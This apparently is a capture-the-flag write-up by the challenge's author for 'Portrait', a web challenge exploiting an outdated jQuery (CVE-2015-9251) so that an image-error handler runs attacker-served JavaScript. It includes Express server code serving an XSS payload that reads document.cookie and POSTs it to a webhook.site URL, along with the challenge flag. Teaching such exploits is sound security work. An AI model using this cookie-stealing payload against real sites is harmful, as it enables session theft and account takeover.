---
layout: post
current: post
cover:  assets/squ1rrel/kyleburgess2025/portrait/cover.webp
navigation: True
title: "Portrait"
date: 2025-04-06 11:59:00
tags: [squ1rrel, web]
class: post-template
subclass: 'post'
author: kyleburgess2025
---

It's like DeviantArt, but with a report button to keep it less Deviant.

Welcome to Portrait, the final challenge I wrote and my first XSS challenge. The idea for this challenge came from a super cool Canvas vuln I read about recently. This XSS vulnerability in the Canvas course software was found by Andrew Healey and can be read about [here](https://github.com/andrew-healey/canvas-lms-vuln). The vulnerability comes from an outdated version of JQuery being used - namely, `1.7.2`, which has [this vulnerability](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9251). The name of this challenge, Portrait, is a cheeky reference to the Canvas vulnerability.

# The Problem

Upon registering for an account, we are brought to a gallery where we can create new portraits, providing a name and a source URL for the image. The gallery also displays our previous portraits as a title and an image combination.

![image of gallery page](/assets/squ1rrel/kyleburgess2025/portrait/gallery.png)
*if you're looking for a gallery curator, MoMA, hmu*

There is also a `/report` endpoint where you can give the admin bot a link to a gallery to visit; the flag will be stored in the cookies of the admin bot. The admin bot will only visit other pages on the Portrait website. Basically, we need to make a portrait that will cause the cookies of the admin bot to be leaked to us when the admin bot visits.

# Diving In

Let's take a look at the suspicious parts of the code.

First, at the top of `static/gallery.html`, we have the following:

```html
<script type="text/javascript" src="https://code.jquery.com/jquery-1.8.1.min.js"></script>
```

Sweet, an outdated version of JQuery! A quick Google of JQuery 1.8.1 leads us back to the [CVE](https://www.cvedetails.com/cve/CVE-2015-9251/) I mentioned earlier. Now, let's see how we can exploit it...

```js
$(document).ready(function () {
    const username = new URLSearchParams(window.location.search).get("username");
    $.ajax({
        url: "/api/portraits/" + username,
        type: "GET",
        success: function (data) {
            data.forEach((portrait) => {
                const col = $("<div>").addClass("col-md-4 mb-4");
                const card = $("<div>").addClass("card shadow-sm");
                const img = $("<img>").addClass("card-img-top").attr("src", portrait.source).attr("alt", portrait.name);
                const cardBody = $("<div>").addClass("card-body text-center");
                const title = $("<h5>").addClass("card-title").text(portrait.name);

                img.on("error", (e) => {
                    $.get(e.currentTarget.src).fail((response) => {
                        if (response.status === 403) {
                            $(e.target).attr("src", "https://cdn.pixabay.com/photo/2021/08/03/06/14/lock-6518557_1280.png");
                        } else {
                            $(e.target).attr(
                                "src",
                                "https://cdn.pixabay.com/photo/2024/02/12/16/05/siguniang-mountain-8568913_1280.jpg"
                            );
                        }
                    });
                });

                cardBody.append(title);
                card.append(img).append(cardBody);
                col.append(card);
                $("#portraitsContainer").append(col);
            });
        },
    });
    // snip
})
```

Ok, first off, we have `$.ajax` being called without the `dataType` option, which is a red flag. However, on success, the data retrieved from the URL is put into an `img` source, so any scripts returned won't be run. Let's look instead at the error handling. If an `img` element has an error, a request is made to the image source and the error code is checked to see which placeholder image should be used.

However, the JQuery CVE we discussed before mentioned that if `dataType` is not specified and Javascript is returned, the script will automatically be run on the client's computer. Thus, if we can deploy a server that serves Javascript instead of an image and make it the source for one of our portraits, we should get XSS! Let's try:

```js
const app = require("express")();
app.use(require("cors")());

const payload = `
(function() {
    alert("XSS");
})();
`;

app.get("/image", (req, res) =>
  const isImage = req.headers.accept.includes("image");
  res.writeHead(200, { "Content-Type": "application/javascript" });
  res.end(payload);
);

app.listen(8081);
```

Using you favorite quick-deploy service (I used `cloudflared`, since it doesn't have an interstitial that checks if you're human), we can get a public URL that we can use as the image source. Let's try this out:

![image of gallery page with xss](/assets/squ1rrel/kyleburgess2025/portrait/xss.png)

Beautiful. Now, let's change the payload:

```js
const app = require("express")();
app.use(require("cors")());

const payload = `
(function() {
    const cookies = document.cookie;
    const url = "https://webhook.site/91c39d9c-76da-4ced-9624-96700b8ad703";

    fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: "cookies=" + encodeURIComponent(cookies)
    });
})();
`

app.get("/image", (req, res) =>
  const isImage = req.headers.accept.includes("image");
  res.writeHead(200, { "Content-Type": "application/javascript" });
  res.end(payload);
);

app.listen(8081);
```

After deploying with `cloudflared` and reporting the link to my account (`http://{CHALLENGE_IP}/gallery?username={ACCOUNT_NAME}`), our Webhook gets pinged!

![image of a Webhook request](/assets/squ1rrel/kyleburgess2025/portrait/webhook.png)

Flag: `squ1rrel{unc_s747us_jqu3ry_l0wk3y_take_two_new_flag_check_this_out_guys}`
